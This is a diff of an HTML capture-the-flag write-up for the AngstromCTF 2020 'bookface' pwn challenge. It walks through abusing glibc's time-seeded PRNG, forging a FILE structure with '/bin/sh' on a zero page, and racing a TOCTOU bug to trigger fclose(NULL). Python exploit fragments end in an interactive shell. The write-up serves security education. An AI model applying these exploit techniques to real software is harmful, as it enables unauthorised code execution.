-&lt;p&gt;To find how &lt;em&gt;glibc PRNG&lt;/em&gt; works we need to dig deeper in &lt;em&gt;glibc&lt;/em&gt; source code, I usually use &lt;strong&gt;Bootlin - Elixir Cross Referencer&lt;/strong&gt; &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:8&#34;&gt;&lt;a href=&#34;#fn:8&#34;&gt;9&lt;/a&gt;&lt;/sup&gt; to navigate Linux Kernel and Glibc source code, basically the &lt;code&gt;rand&lt;/code&gt; function is just wrapper to &lt;code&gt;__random&lt;/code&gt; and the latter is also a wrapper to &lt;code&gt;__random_r&lt;/code&gt;, make sure you are browsing the correct glibc version &lt;strong&gt;glibc-2.23&lt;/strong&gt; &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:9&#34;&gt;&lt;a href=&#34;#fn:9&#34;&gt;10&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;rand()&lt;/code&gt; (see &lt;code&gt;man 3 rand&lt;/code&gt;) will return a pseudo-random integer in range &lt;code&gt;[0, RAND_MAX]&lt;/code&gt;, &lt;code&gt;RAND_MAX&lt;/code&gt; dependent on the implementation, but it&amp;rsquo;s guaranteed that this value is at least &lt;em&gt;32767&lt;/em&gt; (&lt;em&gt;0x7fff&lt;/em&gt;)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34;&gt;6&lt;/a&gt;&lt;/sup&gt;. there is a chance that &lt;code&gt;rand()&lt;/code&gt; will return a integer less than &lt;em&gt;0x1000&lt;/em&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;2-hard-efficient-way-abusing-glibc-prng&#34;&gt;2. Hard efficient way &amp;ldquo;Abusing glibc PRNG&amp;rdquo;:&lt;/h4&gt;
+&lt;p&gt;&lt;em&gt;glibc&lt;/em&gt; pseudo-random-number-generator (&lt;em&gt;PRNG&lt;/em&gt;)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7&#34;&gt;&lt;a href=&#34;#fn:7&#34;&gt;7&lt;/a&gt;&lt;/sup&gt; like any &lt;em&gt;PRNG&lt;/em&gt; generates a sequence of random numbers, this sequence is not truly random, because it is determined by the &lt;em&gt;PRNG&lt;/em&gt;&amp;rsquo;s state which is initially the seed value set by &lt;code&gt;srand&lt;/code&gt;, in our case it is &lt;code&gt;time(NULL)&lt;/code&gt;, &lt;em&gt;glibc PRNG&lt;/em&gt; (see &lt;code&gt;man 3 rand&lt;/code&gt;) use hidden state that is modified on each call, this hidden state is probably located at writable memory in libc address space.&lt;/p&gt;
+&lt;p&gt;To find how &lt;em&gt;glibc PRNG&lt;/em&gt; works we need to dig deeper in &lt;em&gt;glibc&lt;/em&gt; source code, I usually use &lt;strong&gt;Bootlin - Elixir Cross Referencer&lt;/strong&gt; &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:8&#34;&gt;&lt;a href=&#34;#fn:8&#34;&gt;8&lt;/a&gt;&lt;/sup&gt; to browse Linux Kernel and Glibc source code, actually the &lt;code&gt;rand&lt;/code&gt; function is just wrapper to &lt;code&gt;__random&lt;/code&gt; and the latter is also a wrapper to &lt;code&gt;__random_r&lt;/code&gt;, make sure you are browsing the correct glibc version &lt;strong&gt;glibc-2.23&lt;/strong&gt; &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:9&#34;&gt;&lt;a href=&#34;#fn:9&#34;&gt;9&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int
 rand (void)
 {
@@ -399,7 +399,7 @@ __libc_lock_unlock (lock);
 return retval;
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;__random_r&lt;/code&gt; is defined in &lt;code&gt;stdlib/random_r.c&lt;/code&gt; line &lt;code&gt;353&lt;/code&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:10&#34;&gt;&lt;a href=&#34;#fn:10&#34;&gt;11&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;__random_r&lt;/code&gt; is defined in &lt;code&gt;stdlib/random_r.c&lt;/code&gt; line &lt;code&gt;353&lt;/code&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:10&#34;&gt;&lt;a href=&#34;#fn:10&#34;&gt;10&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;
 int
 __random_r (struct random_data *buf, int32_t *result)
@@ -460,7 +460,7 @@ Dump of assembler code for function random_r:
 0x00007ffff7a47c55 &amp;lt;+21&amp;gt;: mov rax,QWORD PTR [rdi]
 ...
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The condition is at *random_r+17, set a break point there and examin rax register&lt;/p&gt;
+&lt;p&gt;The condition is at *&lt;em&gt;random_r+17&lt;/em&gt;, set a break point there and examin &lt;em&gt;rax&lt;/em&gt; register&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;gef&amp;gt; run
 ...
 gef&amp;gt; b *random_r+17
@@ -515,8 +515,8 @@ T.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
 T.sendlineafter(&amp;quot;Content: &amp;quot;, b&#39;A&#39;*11)
 T.sendlineafter(&amp;quot;Content: &amp;quot;, b&#39;A&#39;*11)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;After that will login with a new user id in order to allocate a &lt;code&gt;Zero Page&lt;/code&gt; and write into it the forged &lt;em&gt;FILE&lt;/em&gt; structure.&lt;/p&gt;
-&lt;p&gt;I used the same code in &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34;&gt;6&lt;/a&gt;&lt;/sup&gt; with little modification to make the &lt;em&gt;FILE&lt;/em&gt; structure.&lt;/p&gt;
+&lt;p&gt;After that will login with a new userid in order to allocate a &lt;em&gt;Zero Page&lt;/em&gt; and write into it the forged &lt;em&gt;FILE&lt;/em&gt; structure.&lt;/p&gt;
+&lt;p&gt;I used the same code in &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34;&gt;5&lt;/a&gt;&lt;/sup&gt; with little modification to make the &lt;em&gt;FILE&lt;/em&gt; structure.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def pack_file(_flags=0,
 _IO_read_ptr=0,
 _IO_read_end=0,
@@ -597,15 +597,15 @@ payload = file_struct + b&#39;/bin/sh\x00&#39;
 assert b&#39;\n&#39; not in payload
 T.sendlineafter(&amp;quot;What&#39;s your name? &amp;quot;, payload)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; The &lt;em&gt;rdi&lt;/em&gt; parameter must be even, the offset of &lt;code&gt;/bin/sh&lt;/code&gt; string in this libc isn&amp;rsquo;t even, we can&amp;rsquo;t use it, so we&amp;rsquo;ll write the &lt;code&gt;/bin/sh&lt;/code&gt; string after the &lt;em&gt;FILE&lt;/em&gt; structure, it&amp;rsquo;s aligned to &lt;em&gt;0xf0&lt;/em&gt;, so the string will be at &lt;em&gt;0x00000000000000f0&lt;/em&gt; (since mmap map the zero page at &lt;em&gt;0x0000000000000000&lt;/em&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; The &lt;em&gt;rdi&lt;/em&gt; parameter must be even, the offset of &lt;code&gt;/bin/sh&lt;/code&gt; string in this libc isn&amp;rsquo;t even, we can&amp;rsquo;t use it, so we&amp;rsquo;ll write the &lt;code&gt;/bin/sh&lt;/code&gt; string after the &lt;em&gt;FILE&lt;/em&gt; structure, it&amp;rsquo;s aligned to &lt;em&gt;0xf0&lt;/em&gt;, so the string will be at &lt;em&gt;0x00000000000000f0&lt;/em&gt; (since mmap maps the zero page at &lt;em&gt;0x0000000000000000&lt;/em&gt;).&lt;/p&gt;
 &lt;p&gt;To triger to exploit we must call &lt;code&gt;fclose&lt;/code&gt; with &lt;em&gt;NULL&lt;/em&gt; pointer as parameter. So the call to &lt;code&gt;fopen&lt;/code&gt; must fail and return &lt;em&gt;NULL&lt;/em&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;FILE *f = fopen(file, &amp;quot;rb&amp;quot;);
 fread(user, 1, sizeof (struct profile), f);
 fclose(f);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;How can &lt;code&gt;fopen(file, &amp;quot;rb&amp;quot;)&lt;/code&gt; fails? the mode string is &lt;code&gt;&amp;quot;rb&amp;quot;&lt;/code&gt;, it&amp;rsquo;s a read, so if the file doesn&amp;rsquo;t exists fopen will fail and return NULL.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;Login&lt;/code&gt; function check if the file exist with &lt;code&gt;access&lt;/code&gt; then ask for the survey, where there are multiple calls to &lt;code&gt;read&lt;/code&gt;, it&amp;rsquo;s a blocking function, it will block and wait for user input. It&amp;rsquo;s &lt;code&gt;Time-of-check to time-of-use&lt;/code&gt; (TOCTOU)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:11&#34;&gt;&lt;a href=&#34;#fn:11&#34;&gt;12&lt;/a&gt;&lt;/sup&gt; bug.&lt;/p&gt;
-&lt;p&gt;We&amp;rsquo;ll open another connection and use the same user id to remove the file using the 3rd option &lt;em&gt;&amp;ldquo;deleting account&amp;rdquo;&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Login&lt;/code&gt; function check if the file exists with &lt;code&gt;access&lt;/code&gt; then asks for the survey, where there are multiple calls to &lt;code&gt;read&lt;/code&gt;, it&amp;rsquo;s a blocking function, it will block and wait for user input. This is a &lt;code&gt;Time-of-check to time-of-use&lt;/code&gt; (TOCTOU)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:11&#34;&gt;&lt;a href=&#34;#fn:11&#34;&gt;11&lt;/a&gt;&lt;/sup&gt; bug.&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll open another connection and use the same userid to remove the file using the 3rd option &lt;em&gt;&amp;ldquo;deleting account&amp;rdquo;&lt;/em&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# logout
 T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;4&amp;quot;)
 # login again with the last uid
@@ -626,7 +626,8 @@ T.clean()
 T.sendline(&amp;quot;uname -a;id&amp;quot;)
 T.interactive()
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;flag&#34;&gt;Flag&lt;/h3&gt;
+&lt;h3 id=&#34;final-exploit&#34;&gt;Final Exploit&lt;/h3&gt;
+&lt;p&gt;You can find the full exploit &lt;a href=&#34;https://philomath213.github.io/post/AngstromCTF2020-bookface/exploit_bookface.py&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/AngstromCTF2020-bookface/screenshot1.png&#34; alt=&#34;screenshot1&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 &lt;div class=&#34;footnotes&#34;&gt;
@@ -634,8 +635,6 @@ T.interactive()
 &lt;ol&gt;
 &lt;li id=&#34;fn:1&#34;&gt;&lt;a href=&#34;https://www.ayrx.me/using-a-non-system-libc&#34; target=&#34;_blank&#34;&gt;Using a non-system glibc&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:1&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li id=&#34;fn:12&#34;&gt;&lt;a href=&#34;https://owasp.org/www-community/attacks/Format_string_attack&#34; target=&#34;_blank&#34;&gt;OWASP - Format String Attack&lt;/a&gt;
-&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:12&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li id=&#34;fn:2&#34;&gt;&lt;a href=&#34;https://wiki.debian.org/mmap_min_addr&#34; target=&#34;_blank&#34;&gt;Debian Wiki - mmap_min_addr&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:2&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li id=&#34;fn:3&#34;&gt;&lt;a href=&#34;http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Linux%20Kernel%20Exploitation%20-%20Patrick%20Biernat.pdf&#34; target=&#34;_blank&#34;&gt;Patrick Biernat - Linux Kernel Exploitation&lt;/a&gt;
